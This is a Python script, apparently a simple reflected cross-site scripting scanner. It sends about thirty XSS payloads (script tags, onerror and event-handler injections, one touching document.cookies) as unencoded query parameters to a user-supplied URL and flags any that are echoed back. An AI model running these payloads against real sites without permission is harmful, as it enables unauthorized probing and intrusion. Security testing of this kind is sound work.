import requests
from bs4 import BeautifulSoup


xss_payloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<body onload=alert(1)>',
    '<script>alert(document.domain)</script>',
    '<script>alert(document.cookies)</script>',
    '<img/src/onerror=prompt(8)>',
    '<image src/onerror=prompt(8)>',
    '<img src/onerror=prompt(8)>',
    '<image src =q onerror=prompt(8)>',
    '<img src =q onerror=prompt(8)>',
    '<img src=1 href=1 onerror="javascript:alert(1)"></img>',
    '<audio src=1 href=1 onerror="javascript:alert(1)"></audio>',
    '<video src=1 href=1 onerror="javascript:alert(1)"></video>',
    '<body src=1 href=1 onerror="javascript:alert(1)"></body>',
    '<image src=1 href=1 onerror="javascript:alert(1)"></image>',
    '<object src=1 href=1 onerror="javascript:alert(1)"></object>',
    '<script src=1 href=1 onerror="javascript:alert(1)"></script>',
    '<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>',
    '<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>',
    '<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>',
    '<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>',
    '<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>',
    '<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>',
    '<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>',
    '<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>',
    '<body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>',
    '<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>',
    '<body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>',
    '<body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>',
    '<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>',
    '<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>'
]

def test_xss(url, param):
    for payload in xss_payloads:
        
        payload_url = f"{url}?{param}={payload}"
        print(f"Testing with payload: {payload_url}")

        try:
            
            response = requests.get(payload_url)
            response_content = response.text

            
            if payload in response_content:
                print(f"[!] Potential XSS vulnerability detected with payload: {payload}")
            else:
                print(f"[-] No XSS vulnerability detected with payload: {payload}")

        except Exception as e:
            print(f"Error while testing payload {payload}: {e}")

def main():
    
    url = input("Enter the target URL (without parameters): ")
    param = input("Enter the parameter to test: ")

    
    test_xss(url, param)

if __name__ == "__main__":
    main()

